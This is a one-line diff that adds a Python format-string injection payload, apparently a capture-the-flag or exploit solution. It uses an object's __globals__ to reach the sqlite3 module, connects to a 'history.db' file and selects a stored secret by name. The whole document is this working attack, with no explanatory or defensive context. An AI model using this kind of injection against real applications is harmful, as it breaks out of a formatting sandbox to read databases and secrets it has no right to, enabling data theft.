@@ -1,0 +1,1 @@
+{logify.__globals__['sqlite3'].connect('history.db').execute('SELECT secret FROM secrets WHERE name="oldest_user_of_bartender"').fetchone()[0]}
